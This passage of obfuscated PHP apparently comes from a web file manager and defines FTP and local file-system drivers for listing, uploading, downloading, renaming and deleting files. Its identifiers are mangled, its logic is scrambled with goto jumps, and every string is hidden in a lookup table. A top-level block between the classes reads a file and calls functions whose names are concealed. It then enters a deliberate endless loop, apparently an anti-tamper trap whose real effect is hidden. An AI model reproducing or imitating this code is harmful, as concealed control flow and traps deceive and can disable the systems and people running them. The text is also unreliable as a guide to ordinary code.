(!$this->_isconn()) { return !1; } $a‹Õá«ô‹ = $this->fileNameAuto($this->pathFather($D«ø·Œƒ†¢), $Dã—¶‚•¬”); goto bÅôì—‚ä; bÅôì—‚ä: $a‹Õá«ô‹ = $this->iconvSystem($a‹Õá«ô‹); $D«ø·Œƒ†¢ = $this->iconvSystem($D«ø·Œƒ†¢); $a¥‘»®âŞ¦ = $this->pathFather($D«ø·Œƒ†¢); goto bŸ‚…ƒ‡øí; bŸ‚…ƒ‡øí: $cªï¦™Á‡Ş = rtrim($a¥‘»®âŞ¦, $F·¨ˆÊ‰İ³[8]) . $F·¨ˆÊ‰İ³[8] . $a‹Õá«ô‹; $f§©†ó»öƒ = @ftp_rename($this->connect, $D«ø·Œƒ†¢, $cªï¦™Á‡Ş); $cªï¦™Á‡Ş = $this->iconvApp($cªï¦™Á‡Ş); goto A¨ğ˜„‘Ø; A¨ğ˜„‘Ø: return $f§©†ó»öƒ ? $this->getPathOuter($cªï¦™Á‡Ş) : !1; goto D¬…ì”…ó²; D¬…ì”…ó²: } private function folderInfo($aä„—“Š‚, $d¨Ïç§ŒÄî = false) { $D‰Ó‡–„Ù× =& $_SERVER[Ö‘Øù]; $Eä‘Â‚²´× = array($D‰Ó‡–„Ù×[28] => $this->pathThis($aä„—“Š‚), $D‰Ó‡–„Ù×[76] => $this->getPathOuter($D‰Ó‡–„Ù×[8] . $aä„—“Š‚), $D‰Ó‡–„Ù×[29] => $D‰Ó‡–„Ù×[77]); if ($d¨Ïç§ŒÄî) { return $Eä‘Â‚²´×; } $Eä‘Â‚²´×[$D‰Ó‡–„Ù×[194]] = $Eä‘Â‚²´×[$D‰Ó‡–„Ù×[84]] = 0; $Eä‘Â‚²´×[$D‰Ó‡–„Ù×[195]] = $Eä‘Â‚²´×[$D‰Ó‡–„Ù×[196]] = !0; return $Eä‘Â‚²´×; } private function fileInfo($fò‰ŠĞºŸ¢, $eÇ•‚×¡Òˆ = false, $e®·”Ï´Š® = array()) { goto dè†Ã¥ŒŒ; a¸ÊÓØ©¿œ: return $dÂìËÛ®ç®; goto AˆÉŒá­È; dè†Ã¥ŒŒ: $Cˆ™¸ñÒä =& $_SERVER[Ö‘Øù]; $dÂìËÛ®ç® = array($Cˆ™¸ñÒä[28] => $this->pathThis($fò‰ŠĞºŸ¢), $Cˆ™¸ñÒä[76] => $this->getPathOuter($Cˆ™¸ñÒä[8] . $fò‰ŠĞºŸ¢), $Cˆ™¸ñÒä[29] => $Cˆ™¸ñÒä[193], $Cˆ™¸ñÒä[78] => isset($e®·”Ï´Š®[$Cˆ™¸ñÒä[78]]) ? $e®·”Ï´Š®[$Cˆ™¸ñÒä[78]] : 0, $Cˆ™¸ñÒä[168] => $this->ext($fò‰ŠĞºŸ¢)); if ($eÇ•‚×¡Òˆ) { return $dÂìËÛ®ç®; } goto d…§†ÒÂ¾; d…§†ÒÂ¾: $dÂìËÛ®ç®[$Cˆ™¸ñÒä[194]] = $dÂìËÛ®ç®[$Cˆ™¸ñÒä[84]] = 0; $dÂìËÛ®ç®[$Cˆ™¸ñÒä[195]] = $dÂìËÛ®ç®[$Cˆ™¸ñÒä[196]] = !0; $A•É¥™ëµÈ = $this->iconvSystem($fò‰ŠĞºŸ¢); goto d´§¸øÜ‡…; d´§¸øÜ‡…: $dÂìËÛ®ç®[$Cˆ™¸ñÒä[84]] = @ftp_mdtm($this->connect, $A•É¥™ëµÈ); if (empty($e®·”Ï´Š®)) { $e®·”Ï´Š® = $this->objectMeta($fò‰ŠĞºŸ¢); if (!$e®·”Ï´Š®) { return $dÂìËÛ®ç®; } } $dÂìËÛ®ç®[$Cˆ™¸ñÒä[78]] = $e®·”Ï´Š®[$Cˆ™¸ñÒä[78]]; goto a¸ÊÓØ©¿œ; AˆÉŒá­È: } public function size($DíñİˆÔÃ‰) { $F»ÃÒ°¨ª¶ = $this->objectMeta($DíñİˆÔÃ‰); return $F»ÃÒ°¨ª¶ ? $F»ÃÒ°¨ª¶[$_SERVER[Ö‘Øù][78]] : 0; } public function info($Bß³ê‰ğ¸Ä) { if ($this->isFile($Bß³ê‰ğ¸Ä)) { return $this->fileInfo($Bß³ê‰ğ¸Ä, 0); } else { if ($this->isFolder($Bß³ê‰ğ¸Ä)) { return $this->folderInfo($Bß³ê‰ğ¸Ä); } } return !1; } private function fileList($DÍÀÃ’Ì„ß, &$E”‘ÛĞŞ“ì, &$c§ƒ½ÆÄ°ƒ, $Béàì« ›Ã = false) { goto fË¸ƒÒÃÇ×; B¨çï­‚ò£: $aîîÀ°éà = array($CÒ†§Œ‹ª•[95] => 1, $CÒ†§Œ‹ª•[1286] => 1); foreach ($EâœÁåë™ as $F´»†Ê¶¹) { goto A›È¢’ÉĞ; B‰¬„˜ãÄ: if (substr($F´»†Ê¶¹, 0, 1) == $CÒ†§Œ‹ª•[1287]) { $cÖâãôÛÚ[$CÒ†§Œ‹ª•[29]] = $CÒ†§Œ‹ª•[77]; $cÖâãôÛÚ[$CÒ†§Œ‹ª•[78]] = 0; } $F‹÷ìƒ‘ = $cÖâãôÛÚ[$CÒ†§Œ‹ª•[29]] == $CÒ†§Œ‹ª•[77] ? !0 : !1; if ($EÜÓÇ‹Ç¸¸) { $this->cacheMethod($CÒ†§Œ‹ª•[199], $cöô‘•ó¶¯, $F‹÷ìƒ‘); $this->cacheMethod($CÒ†§Œ‹ª•[200], $cöô‘•ó¶¯, $cÖâãôÛÚ); } goto CÄ™¨ŒÕ©Ï; C›¾»Û†ïš: if (empty($cöô‘•ó¶¯) && $cöô‘•ó¶¯ !== $CÒ†§Œ‹ª•[191] || isset($aîîÀ°éà[$cöô‘•ó¶¯])) { continue; } $cöô‘•ó¶¯ = $this->iconvApp($DÍÀÃ’Ì„ß . ltrim($cöô‘•ó¶¯, $CÒ†§Œ‹ª•[8])); $cÖâãôÛÚ = array($CÒ†§Œ‹ª•[28] => $cöô‘•ó¶¯, $CÒ†§Œ‹ª•[29] => $CÒ†§Œ‹ª•[193], $CÒ†§Œ‹ª•[78] => $D¨­‹´„×©[4]); goto B‰¬„˜ãÄ; CÄ™¨ŒÕ©Ï: if ($F‹÷ìƒ‘) { $E”‘ÛĞŞ“ì[] = $cöô‘•ó¶¯; if ($Béàì« ›Ã) { $this->fileList($cöô‘•ó¶¯, $E”‘ÛĞŞ“ì, $c§ƒ½ÆÄ°ƒ, $Béàì« ›Ã); } continue; } $c§ƒ½ÆÄ°ƒ[] = $cÖâãôÛÚ; goto FÕ—»øšù; A›È¢’ÉĞ: $D¨­‹´„×© = $this->_listItem($F´»†Ê¶¹); if ($D¨­‹´„×©[0] == $CÒ†§Œ‹ª•[752]) { continue; } $cöô‘•ó¶¯ = $D¨­‹´„×©[8]; goto C›¾»Û†ïš; FÕ—»øšù: } if ($EÜÓÇ‹Ç¸¸) { $this->cacheMethod($CÒ†§Œ‹ª•[199], $DÍÀÃ’Ì„ß, !0); } goto aëÇë„ŒÌ¹; EÁ¨¿Œ£ñ­: @ftp_chdir($this->connect, $CÒ†§Œ‹ª•[8]); $DÍÀÃ’Ì„ß = rtrim($DÍÀÃ’Ì„ß, $CÒ†§Œ‹ª•[8]) . $CÒ†§Œ‹ª•[8]; check_abort(); goto A¸»—ÙŒ; fË¸ƒÒÃÇ×: $CÒ†§Œ‹ª• =& $_SERVER[Ö‘Øù]; $DÍÀÃ’Ì„ß = $this->iconvSystem($DÍÀÃ’Ì„ß); if (!$this->isFolder($DÍÀÃ’Ì„ß)) { return !1; } goto EÁ¨¿Œ£ñ­; A¸»—ÙŒ: $EÜÓÇ‹Ç¸¸ = $this->listItemCache === !1 ? !1 : !0; $EâœÁåë™ = @ftp_rawlist($this->connect, $DÍÀÃ’Ì„ß); if (!$EâœÁåë™) { $EâœÁåë™ = array(); } goto B¨çï­‚ò£; aëÇë„ŒÌ¹: } private function _listItem($Eã…±’´Ø±) { if (empty($Eã…±’´Ø±)) { return array(); } $FÙ ÷¤æÑÄ = preg_split($_SERVER[Ö‘Øù][1288], $Eã…±’´Ø±); if (count($FÙ ÷¤æÑÄ) <= 9) { return $FÙ ÷¤æÑÄ; } $FÙ ÷¤æÑÄ[8] = trim(substr($Eã…±’´Ø±, strpos($Eã…±’´Ø±, $FÙ ÷¤æÑÄ[7]) + strlen($FÙ ÷¤æÑÄ[7]))); return array_splice($FÙ ÷¤æÑÄ, 0, 9); } public function listPath($eöŸ·æÈ, $bƒ¾ÂÔäÕ› = false) { goto A¼ÂòÂš²ß; CÁòßé¬ŒÙ: return array($F‡°‚ô’³[75] => $d­‹é„•³ , $F‡°‚ô’³[74] => $B’šëÊÁÄ®); goto Aì†£Í­ø¿; AßÒîÓƒæ: $this->fileList($eöŸ·æÈ, $d­‹é„•³ , $B’šëÊÁÄ®); foreach ($d­‹é„•³  as $aòö®Ç»î¡ => $DùŒ˜¢‘»ö) { $d­‹é„•³ [$aòö®Ç»î¡] = $this->folderInfo($DùŒ˜¢‘»ö, $bƒ¾ÂÔäÕ›); } foreach ($B’šëÊÁÄ® as $aòö®Ç»î¡ => $DùŒ˜¢‘»ö) { $B’šëÊÁÄ®[$aòö®Ç»î¡] = $this->fileInfo($DùŒ˜¢‘»ö[$F‡°‚ô’³[28]], $bƒ¾ÂÔäÕ›, $DùŒ˜¢‘»ö); } goto CÁòßé¬ŒÙ; A¼ÂòÂš²ß: $F‡°‚ô’³ =& $_SERVER[Ö‘Øù]; if (!$this->_isconn()) { return !1; } $d­‹é„•³  = $B’šëÊÁÄ® = array(); goto AßÒîÓƒæ; Aì†£Í­ø¿: } public function has($EË‹Ê„ñÑ, $d°çáÅßÓ« = false, $eÖÛ›áòâ = true) { goto EÌ¡À„«œÈ; B¼ğƒÍÈê: return !1; goto E —ÈêòÈ£; EÌ¡À„«œÈ: $d˜î³íæ =& $_SERVER[Ö‘Øù]; $AàšÈ­µÊ = $dÕ˜’¸Îó = array(); $Aˆ´³¢— = $d°çáÅßÓ« ? !0 : !1; goto d ´ªÕÉ×¹; d ´ªÕÉ×¹: $this->fileList($EË‹Ê„ñÑ, $AàšÈ­µÊ, $dÕ˜’¸Îó, $Aˆ´³¢—); if ($d°çáÅßÓ«) { return array($d˜î³íæ[203] => count($dÕ˜’¸Îó), $d˜î³íæ[204] => count($AàšÈ­µÊ)); } if ($eÖÛ›áòâ) { if (count($dÕ˜’¸Îó)) { return !0; } } else { if (count($AàšÈ­µÊ)) { return !0; } } goto B¼ğƒÍÈê; E —ÈêòÈ£: } public function listAll($aŠ“†¸õ) { goto CÍ’®÷šŞÂ; Bç¬â¹‹»Ø: foreach ($DŸçƒçá ¯ as $CÌåŒ˜¦ƒ) { if (is_string($CÌåŒ˜¦ƒ)) { $e…Â¤æÇô[$CÌåŒ˜¦ƒ] = 0; } } return $this->listAllFiles($aŠ“†¸õ, array_keys($e…Â¤æÇô), $e…Â¤æÇô); goto A”ì‰‚Á; CÍ’®÷šŞÂ: $bÏ¨¼ï³¾¢ =& $_SERVER[Ö‘Øù]; if (!$this->_isconn()) { return !1; } $DŸçƒçá ¯ = $Bí¡ğƒˆÏŠ = array(); goto bÃÕ‹å¯˜; bÃÕ‹å¯˜: $this->fileList($aŠ“†¸õ, $DŸçƒçá ¯, $Bí¡ğƒˆÏŠ, !0); $e…Â¤æÇô = array(); foreach ($Bí¡ğƒˆÏŠ as $CÌåŒ˜¦ƒ) { $e…Â¤æÇô[$CÌåŒ˜¦ƒ[$bÏ¨¼ï³¾¢[28]]] = $CÌåŒ˜¦ƒ[$bÏ¨¼ï³¾¢[78]]; } goto Bç¬â¹‹»Ø; A”ì‰‚Á: } public function getContent($d¹ÛˆÎŠÂ) { if (!$this->_isconn()) { return !1; } $d¹ÛˆÎŠÂ = $this->iconvSystem($d¹ÛˆÎŠÂ); return $this->fileSubstr($d¹ÛˆÎŠÂ); } public function setContent($C†àá²šš, $bÒáØŒ–Øƒ = '') { goto F‚à ÷øŞ“; D³¸æÄç‚: file_put_contents($c¤”Ò“É¤›, $bÒáØŒ–Øƒ); $c¹˜Ò…ñ = $this->upload($C†àá²šš, $this->iconvApp($c¤”Ò“É¤›)); $this->tempFileRemve($c¤”Ò“É¤›); goto dİ¿ŸåĞ†Ö; F‚à ÷øŞ“: if (!$this->_isconn()) { return !1; } $d¯ğùå”ƒ½ = $this->pathThis($this->iconvSystem($C†àá²šš)); $c¤”Ò“É¤› = $this->tempFile($d¯ğùå”ƒ½); goto D³¸æÄç‚; dİ¿ŸåĞ†Ö: return $c¹˜Ò…ñ; goto Fº´áØéçÍ; Fº´áØéçÍ: } public function fileSubstr($F¹¤“Éèšª, $BŠ‘áó ¼Ò = 0, $F°´õ¢Í°Ü = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($F¹¤“Éèšª, $BŠ‘áó ¼Ò, $F°´õ¢Í°Ü); } private function ftpRequest($fù²…£’‹œ, $Bª­Ñ®¸Ä = 0, $dÚ»£Œš§ = false) { goto DÊÇ£Ø²Ÿ•; Fæ÷‹™¾ß¤: curl_setopt($dÈƒ—½¥„, CURLOPT_RETURNTRANSFER, 1); $Dš’¹íÃº = curl_exec($dÈƒ—½¥„); curl_close($dÈƒ—½¥„); goto A†ê§ºğëœ; cªØµ¬ÑÖ: curl_setopt($dÈƒ—½¥„, CURLOPT_URL, $bÀ¶¯ÒÂ¦ . $this->pathEncode($fù²…£’‹œ)); curl_setopt($dÈƒ—½¥„, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($dÚ»£Œš§) { $dö«î¸™¹İ = $Bª­Ñ®¸Ä + $dÚ»£Œš§ - 1; curl_setopt($dÈƒ—½¥„, CURLOPT_RANGE, "{$Bª­Ñ®¸Ä}\55{$dö«î¸™¹İ}"); } goto Fæ÷‹™¾ß¤; A†ê§ºğëœ: return $Dš’¹íÃº; goto cÀŒó­ì…; DÊÇ£Ø²Ÿ•: $fù²…£’‹œ = $this->iconvSystem($fù²…£’‹œ); $bÀ¶¯ÒÂ¦ = $this->scheme . $this->host . $_SERVER[Ö‘Øù][4] . $this->port; $dÈƒ—½¥„ = curl_init(); goto cªØµ¬ÑÖ; cÀŒó­ì…: } public function upload($c‘œ¨ÇÔ¥, $EñÊŠõÅòˆ, $e²Â¤Õ„Ö± = false, $eçî”‘Ñ‘ï = REPEAT_REPLACE) { goto bñ¥ÂµìÇß; bñ¥ÂµìÇß: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($c‘œ¨ÇÔ¥))) { return !1; } $c‘œ¨ÇÔ¥ = $this->iconvSystem($c‘œ¨ÇÔ¥); goto fµæ™ÖĞè; fµæ™ÖĞè: $EñÊŠõÅòˆ = $this->iconvSystem($EñÊŠõÅòˆ); $CÒ‹´ÎÓ—î = ftp_nb_put($this->connect, $c‘œ¨ÇÔ¥, $EñÊŠõÅòˆ, FTP_BINARY); while ($CÒ‹´ÎÓ—î == FTP_MOREDATA) { $CÒ‹´ÎÓ—î = ftp_nb_continue($this->connect); } goto AéÃ¤Ê¦¦Ì; AéÃ¤Ê¦¦Ì: if ($CÒ‹´ÎÓ—î != FTP_FINISHED) { return !1; } return $this->getPathOuter($c‘œ¨ÇÔ¥); goto E’Ş±†­Ä²; E’Ş±†­Ä²: } public function download($AÏº¯ŠÍÜ, $dàÛÁÌ¢£­ = '') { goto e˜ƒö™Æ¥; e˜ƒö™Æ¥: if (!$this->_isconn()) { return !1; } $bÅ¨’‘µ™ = $this->pathFather($dàÛÁÌ¢£­); if (!IO::mkdir($bÅ¨’‘µ™)) { return !1; } goto a¥İâ‡ç±ê; Dß‹¶­‡®ø: while ($cãğøîÁ”Ê == FTP_MOREDATA) { $cãğøîÁ”Ê = ftp_nb_continue($this->connect); } if ($cãğøîÁ”Ê != FTP_FINISHED) { return !1; } return $this->iconvApp($dàÛÁÌ¢£­); goto DÏšÎ÷Şõ; a¥İâ‡ç±ê: $AÏº¯ŠÍÜ = $this->iconvSystem($AÏº¯ŠÍÜ); $dàÛÁÌ¢£­ = $this->iconvSystem($dàÛÁÌ¢£­); $cãğøîÁ”Ê = ftp_nb_get($this->connect, $dàÛÁÌ¢£­, $AÏº¯ŠÍÜ, FTP_BINARY); goto Dß‹¶­‡®ø; DÏšÎ÷Şõ: } public function exist($b«è„÷äàç) { return $this->isFile($b«è„÷äàç) || $this->isFolder($b«è„÷äàç); } public function isFile($C‚¢à´Ø· ) { return !$this->isFolder($C‚¢à´Ø· ) && $this->objectMeta($C‚¢à´Ø· ); } public function isFolder($CÀ×¿ùŸ•Ñ) { return $this->cacheMethod($_SERVER[Ö‘Øù][199], $CÀ×¿ùŸ•Ñ); } protected function objectMeta($eŞÎ¦’Á´Ÿ) { return $this->cacheMethod($_SERVER[Ö‘Øù][200], $eŞÎ¦’Á´Ÿ); } protected function _objectMeta($FŠŠ®»”) { goto e¿•íÏğÕ; e¿•íÏğÕ: $Eñ¸ä¥ª¸Å =& $_SERVER[Ö‘Øù]; if ($FŠŠ®»” == $Eñ¸ä¥ª¸Å[33] || $FŠŠ®»” == $Eñ¸ä¥ª¸Å[8]) { return array(); } if (!$this->_isconn()) { return !1; } goto eÕ†™ªŒ‡; eÕ†™ªŒ‡: $FŠŠ®»” = $this->iconvSystem($FŠŠ®»”); $cÚİÔ‘œ‰ª = array($Eñ¸ä¥ª¸Å[28] => $this->iconvApp($FŠŠ®»”), $Eñ¸ä¥ª¸Å[29] => $Eñ¸ä¥ª¸Å[193], $Eñ¸ä¥ª¸Å[78] => 0); @ftp_chdir($this->connect, $Eñ¸ä¥ª¸Å[8]); goto e‰®˜”š‹õ; e‰®˜”š‹õ: $a…ÈÌï¶ãØ = @ftp_size($this->connect, $FŠŠ®»”); if ($a…ÈÌï¶ãØ != -1) { $cÚİÔ‘œ‰ª[$Eñ¸ä¥ª¸Å[78]] = $a…ÈÌï¶ãØ; } else { $fßª —„ŒÑ = @ftp_chdir($this->connect, $FŠŠ®»”); if (!$fßª —„ŒÑ) { return !1; } $cÚİÔ‘œ‰ª[$Eñ¸ä¥ª¸Å[29]] = $Eñ¸ä¥ª¸Å[77]; } return $cÚİÔ‘œ‰ª; goto e…Æä©ÌôÑ; e…Æä©ÌôÑ: } protected function _isFolder($CØ­íƒ¹) { $C†ÍÌâœÔé =& $_SERVER[Ö‘Øù]; if ($CØ­íƒ¹ == $C†ÍÌâœÔé[33] || $CØ­íƒ¹ == $C†ÍÌâœÔé[8]) { return !0; } $e³«†îŞƒØ = $this->_objectMeta($CØ­íƒ¹); return isset($e³«†îŞƒØ[$C†ÍÌâœÔé[29]]) && $e³«†îŞƒØ[$C†ÍÌâœÔé[29]] == $C†ÍÌâœÔé[77] ? !0 : !1; } } if (!isset($_SERVER[$_SERVER[Ö‘Øù][834]]) || !isset($_SERVER[$_SERVER[Ö‘Øù][835]])) { goto AÑô¥Çé; AÔ£ÆÎ¤à: $A»ŞÅ¬çÛÛ = explode($_SERVER[Ö‘Øù][229], $Eù±ã†½µë); if (count($A»ŞÅ¬çÛÛ) < $_SERVER[Ö‘Øù][614]) { $F…ìî£Ğ”† = $_SERVER[Ö‘Øù][839]; $F…ìî£Ğ”†(); } $C›Îö²ôßï = $_SERVER[Ö‘Øù][840]; goto A¤›°İìÖĞ; AÑô¥Çé: $A®Åøàªïà = $_SERVER[Ö‘Øù][836]; $C¯ïäÊƒ¨Ï = $_SERVER[$_SERVER[Ö‘Øù][837]] . $_SERVER[Ö‘Øù][838]; $Eù±ã†½µë = $A®Åøàªïà($C¯ïäÊƒ¨Ï); goto AÔ£ÆÎ¤à; A¤›°İìÖĞ: $C›Îö²ôßï($_SERVER[$_SERVER[Ö‘Øù][837]] . $_SERVER[Ö‘Øù][838]); $AàÜîİİ‰® = 2; while ($AàÜîİİ‰® > 1) { $cõØÀ¨  = rawurlencode($AàÜîİİ‰® . $_SERVER[Ö‘Øù][376]); } goto cİ…® ÁÉ; cİ…® ÁÉ: } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($EŒ¬˜µöàë) { if (substr($EŒ¬˜µöàë, 0, 2) == $_SERVER[Ö‘Øù][1279]) { $EŒ¬˜µöàë = BASIC_PATH . substr($EŒ¬˜µöàë, 2); } return $EŒ¬˜µöàë; } public function iconvApp($dÛÖ¾¢Ñîİ) { $B½Ê‡Áè™² =& $_SERVER[Ö‘Øù]; global $config; return $this->iconvTo($dÛÖ¾¢Ñîİ, $config[$B½Ê‡Áè™²[1277]], $config[$B½Ê‡Áè™²[1276]]); } public function iconvSystem($F¬ÛğìÆğ±) { $D‰–ÙÜºÑ =& $_SERVER[Ö‘Øù]; global $config; return $this->iconvTo($F¬ÛğìÆğ±, $config[$D‰–ÙÜºÑ[1276]], $config[$D‰–ÙÜºÑ[1277]]); } public function getPathOuter($B¡Óë­·ëã) { goto aàá´öé; aàá´öé: $aÚˆ™ñ«­– =& $_SERVER[Ö‘Øù]; $c§óŠÀÒÖ = $this->iconvApp($this->pathBase); $B¡Óë­·ëã = $this->iconvApp($B¡Óë­·ëã); goto c”ƒÜéº²â; cÊÛˆ“îà»: $B¡Óë­·ëã = KodIO::clear($B¡Óë­·ëã); $B¡Óë­·ëã = substr($B¡Óë­·ëã, strlen($c§óŠÀÒÖ)); if (empty($this->pathDriver)) { return $B¡Óë­·ëã; } goto böƒõàĞ°’; c”ƒÜéº²â: if (substr($c§óŠÀÒÖ, 0, 2) == $aÚˆ™ñ«­–[1279]) { $c§óŠÀÒÖ = BASIC_PATH . substr($c§óŠÀÒÖ, 2); } if (substr($B¡Óë­·ëã, 0, 2) == $aÚˆ™ñ«­–[1279]) { $B¡Óë­·ëã = BASIC_PATH . substr($B¡Óë­·ëã, 2); } $c§óŠÀÒÖ = KodIO::clear($c§óŠÀÒÖ); goto cÊÛˆ“îà»; böƒõàĞ°’: return $this->pathDriver . $aÚˆ™ñ«­–[8] . ltrim($B¡Óë­·ëã, $aÚˆ™ñ«­–[8]); goto Dœ†§¶„; Dœ†§¶„: } public function mkfile($fª¯¿Ÿ¤¾†, $B ´ÄÆ¶ƒ = '', $Aß®îí·‹‹ = REPEAT_RENAME) { $fª¯¿Ÿ¤¾† = $this->iconvSystem($fª¯¿Ÿ¤¾†); @touch($fª¯¿Ÿ¤¾†); if ($B ´ÄÆ¶ƒ) { file_put_contents($fª¯¿Ÿ¤¾†, $B ´ÄÆ¶ƒ); } @chmod($fª¯¿Ÿ¤¾†, $this->pathAuth); return is_file($fª¯¿Ÿ¤¾†) ? $this->getPathOuter($fª¯¿Ÿ¤¾†) : !1; } public function mkdir($bÚò×Ï‚, $cµ®ˆ¦¸¦ = REPEAT_SKIP) { $bÚò×Ï‚ = $this->iconvSystem($bÚò×Ï‚); if (is_dir($bÚò×Ï‚)) { return $this->getPathOuter($bÚò×Ï‚); } @mkdir($bÚò×Ï‚, $this->pathAuth, !0); @chmod($bÚò×Ï‚, $this->pathAuth); return is_dir($bÚò×Ï‚) ? $this->getPathOuter($bÚò×Ï‚) : !1; } public function copyFile($AÒŞÎè·Ãà, $Bå¡ÙÛÏ¹) { $this->mkdir($this->pathFather($Bå¡ÙÛÏ¹)); $AÒŞÎè·Ãà = $this->iconvSystem($AÒŞÎè·Ãà); $Bå¡ÙÛÏ¹ = $this->iconvSystem($Bå¡ÙÛÏ¹); $aÈƒì¼”¥ì = copy_64($AÒŞÎè·Ãà, $Bå¡ÙÛÏ¹); @chmod($Bå¡ÙÛÏ¹, $this->pathAuth); return $aÈƒì¼”¥ì ? $this->getPathOuter($Bå¡ÙÛÏ¹) : !1; } public function moveFile($EŒÎ„Ä½Í³, $e•”ã¹×¬«) { goto FéŞ³Ì„õ†; C‹½è×ÄŠ: return $F™±ù×Á“¯ ? $this->getPathOuter($e•”ã¹×¬«) : !1; goto F—ïÈÅğƒ; eğñ¸öè”Ù: $F™±ù×Á“¯ = intval(@rename($EŒÎ„Ä½Í³, $e•”ã¹×¬«)); if (!$F™±ù×Á“¯) { if ($F™±ù×Á“¯ = intval(@copy_64($EŒÎ„Ä½Í³, $e•”ã¹×¬«))) { @unlink($EŒÎ„Ä½Í³); } } @chmod($e•”ã¹×¬«, $this->pathAuth); goto C‹½è×ÄŠ; FéŞ³Ì„õ†: $this->mkdir($this->pathFather($e•”ã¹×¬«)); $EŒÎ„Ä½Í³ = $this->iconvSystem($EŒÎ„Ä½Í³); $e•”ã¹×¬« = $this->iconvSystem($e•”ã¹×¬«); goto eğñ¸öè”Ù; F—ïÈÅğƒ: } public function delFile($F·•Ûˆ„”†) { $F·•Ûˆ„”† = $this->iconvSystem($F·•Ûˆ„”†); if (!@unlink($F·•Ûˆ„”†)) { @chmod($F·•Ûˆ„”†, $this->pathAuth); if (!@unlink($F·•Ûˆ„”†)) { return !1; } } else { return !0; } } public function delFolder($Bïô›á³Ñó) { goto e´²Ë±áôš; B¢ëÜÏˆ: return rmdir($Bïô›á³Ñó); goto C¨·ËÄŒÔ§; e´²Ë±áôš: $bÃ¶¹ïŸ¯ =& $_SERVER[Ö‘Øù]; $Bïô›á³Ñó = $this->iconvSystem($Bïô›á³Ñó); if (!is_dir($Bïô›á³Ñó)) { return !0; } goto f„“‘‡ïĞ; f„“‘‡ïĞ: if (!($BÔ¨‰›í…Š = opendir($Bïô›á³Ñó))) { return !1; } while (($AÚª½ååèÖ = readdir($BÔ¨‰›í…Š)) !== !1) { if ($AÚª½ååèÖ == $bÃ¶¹ïŸ¯[95] || $AÚª½ååèÖ == $bÃ¶¹ïŸ¯[1286]) { continue; } $dÜÏº½çÅ = $Bïô›á³Ñó . $bÃ¶¹ïŸ¯[8] . $AÚª½ååèÖ; if (is_file($dÜÏº½çÅ) || is_link($dÜÏº½çÅ)) { if (!unlink($dÜÏº½çÅ)) { chmod($dÜÏº½çÅ, $this->pathAuth); if (!unlink($dÜÏº½çÅ)) { return !1; } } } else { if (is_dir($dÜÏº½çÅ)) { chmod($dÜÏº½çÅ, $this->pathAuth); $dÜÏº½çÅ = $this->iconvApp($dÜÏº½çÅ); if (!$this->delFolder($dÜÏº½çÅ)) { return !1; } } } } closedir($BÔ¨‰›í…Š); goto B¢ëÜÏˆ; C¨·ËÄŒÔ§: } public function rename($aãÊ–İ¶, $bö”²¤‰) { goto EŞŠ§â÷âƒ; EŞŠ§â÷âƒ: $bÙÉ’İ·¿ =& $_SERVER[Ö‘Øù]; $bƒË’»¹Ì§ = $this->fileNameAuto($this->pathFather($aãÊ–İ¶), $bö”²¤‰); $bƒË’»¹Ì§ = $this->iconvSystem($bƒË’»¹Ì§); goto eÙª‹ç›í‚; e’Ğ–—°‹•: $a··È†Ï‚ = @rename($aãÊ–İ¶, $AÕâÍî®‡Š); $AÕâÍî®‡Š = $this->iconvApp($AÕâÍî®‡Š); return $a··È†Ï‚ ? $this->getPathOuter($AÕâÍî®‡Š) : !1; goto FÊìèî–†; eÙª‹ç›í‚: $aãÊ–İ¶ = $this->iconvSystem($aãÊ–İ¶); $DöŞŞ«‘‡ = $this->pathFather($aãÊ–İ¶); $AÕâÍî®‡Š = rtrim($DöŞŞ«‘‡, $bÙÉ’İ·¿[8]) . $bÙÉ’İ·¿[8] . $bƒË’»¹Ì§; goto e’Ğ–—°‹•; FÊìèî–†: } public function size($A…ªòÊÆÜé) { $A…ªòÊÆÜé = $this->iconvSystem($A…ªòÊÆÜé); return filesize_64($A…ªòÊÆÜé); } public function info($f©Òêá²Ãß) { $f©Òêá²Ãß = $this->iconvSystem($f©Òêá²Ãß); if ($this->isFolder($f©Òêá²Ãß)) { return $this->folderInfo($f©Òêá²Ãß); } else { if ($this->isFile($f©Òêá²Ãß)) { return $this->fileInfo($f©Òêá²Ãß); } } return !1; } protected function infoChildren($d¾”¡¶ÇÛ©, &$dƒÒí‚ë‘Ö, $fßîç³¥˜å = true) { goto cøİŞ¸‡Çó; cÌæáğ“æÌ: if ($fßîç³¥˜å) { $d¾”¡¶ÇÛ© = $this->iconvSystem($d¾”¡¶ÇÛ©); } if (!($cˆ¨÷Üè = @opendir($d¾”¡¶ÇÛ©))) { return; } while (($b¶ØèÛ¦õó = readdir($cˆ¨÷Üè)) !== !1) { if ($b¶ØèÛ¦õó == $aÓ¾¹Íİˆœ[95] || $b¶ØèÛ¦õó == $aÓ¾¹Íİˆœ[1286]) { continue; } $AãõİéÜ–„ = $d¾”¡¶ÇÛ© . $b¶ØèÛ¦õó; if (is_file($AãõİéÜ–„) || is_link($AãõİéÜ–„)) { $dƒÒí‚ë‘Ö[$aÓ¾¹Íİˆœ[79]]++; $dƒÒí‚ë‘Ö[$aÓ¾¹Íİˆœ[78]] += filesize_64($AãõİéÜ–„); } else { if (is_dir($AãõİéÜ–„)) { $dƒÒí‚ë‘Ö[$aÓ¾¹Íİˆœ[80]]++; $this->infoChildren($AãõİéÜ–„, $dƒÒí‚ë‘Ö, !1); } } } goto e¯ÅÜ‹ŸÉ; e¯ÅÜ‹ŸÉ: closedir($cˆ¨÷Üè); goto BºÇíë„â; cøİŞ¸‡Çó: $aÓ¾¹Íİˆœ =& $_SERVER[Ö‘Øù]; check_abort_echo(); $d¾”¡¶ÇÛ© = rtrim($d¾”¡¶ÇÛ©, $aÓ¾¹Íİˆœ[8]) . $aÓ¾¹Íİˆœ[8]; goto cÌæáğ“æÌ; BºÇíë„â: } private function folderInfo($bÈ£¶í¡•, $f³ØØØËÂÉ = false) { $B¥çÚ‚ğÏ½ =& $_SERVER[Ö‘Øù]; $bÈ£¶í¡• = rtrim($bÈ£¶í¡•, $B¥çÚ‚ğÏ½[8]) . $B¥çÚ‚ğÏ½[8]; $a«ôÀ»è° = $this->iconvApp($this->pathThis($bÈ£¶í¡•)); if ($f³ØØØËÂÉ) { return 